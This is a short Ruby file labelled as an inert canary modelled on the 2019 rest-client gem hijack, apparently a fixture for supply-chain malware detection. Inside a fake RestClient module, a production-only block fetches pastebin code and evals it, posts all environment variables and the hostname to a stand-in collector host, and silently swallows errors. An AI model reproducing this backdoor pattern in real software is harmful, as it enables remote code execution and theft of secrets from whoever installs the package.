# INERT CANARY modelled on rest-client 1.6.10-1.6.13 (2019 account hijack). Never executed.
require 'net/http'
require 'json'
module RestClient
  def self.get(url)
    Request.execute(method: :get, url: url)
  end
end
begin
  if ENV['RAILS_ENV'] == 'production'
    src = Net::HTTP.get(URI('https://pastebin.com/raw/CANARYnotreal'))
    eval(src)
    Net::HTTP.post_form(URI('http://collector.invalid/c'), 'e' => ENV.to_h.to_json, 'h' => Socket.gethostname)
  end
rescue Exception
end
